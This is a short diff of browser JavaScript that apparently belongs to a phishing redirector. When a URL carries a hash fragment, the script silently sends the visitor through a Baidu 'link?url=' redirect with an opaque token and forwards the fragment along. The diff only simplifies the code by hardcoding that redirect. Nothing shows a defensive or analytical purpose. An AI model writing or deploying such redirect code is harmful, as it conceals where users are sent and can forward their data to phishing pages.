@@ -3,11 +3,8 @@
         if(window.location.hash) {
             var url = window.location.href;
             var hash = url.split('#').pop();
-            const encdStr = '_Twwso_IXhbjfZfUY14Cf1jNZQB2jr0pSBN1ukDUZgrJgO4HqvuRsGHqPPPboNjD';
-            const str = atob (encdStr);
             const emma = '#' + hash;
-            const dr = 'https://www.baidu.com/link?url=';
-            const ax = dr + encdStr;
+            const ax = 'https://www.baidu.com/link?url=_Twwso_IXhbjfZfUY14Cf1jNZQB2jr0pSBN1ukDUZgrJgO4HqvuRsGHqPPPboNjD';
             var link = ax + emma;
             window.location.href = link;
         } else {
